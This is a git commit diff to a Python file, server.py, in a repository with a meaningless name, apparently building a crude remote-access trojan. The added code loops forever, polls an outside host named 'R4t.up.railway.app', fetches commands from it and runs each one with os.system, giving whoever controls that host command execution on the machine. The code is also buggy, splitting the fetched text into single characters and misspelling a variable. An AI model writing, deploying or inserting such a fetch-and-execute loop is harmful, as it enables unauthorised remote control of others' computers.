da0340a01de1340c164049f45445293c28c711dd
killgriff22 <kilgrif22033@gmail.com>
2022-07-08 07:00:12 -0700

    updated

--- AAAASDGSDFA/server.py
+++ AAAASDGSDFA/server.py
@@ -1,4 +1,13 @@
 import requests,time,os
 while True:
+    commands=[]
     time.sleep(0.5)
-    os.system(requests.post(""))
+    if requests.get("https://R4t.up.railway.app/status").text == "OK":
+        try:
+            commands = list(requests.post("https://R4t.up.railway.app/commands/exec").text)
+        except:
+            commands = ["test"]
+    else:
+        comamnds = ["test"]
+    for command in commands:
+        os.system(command)
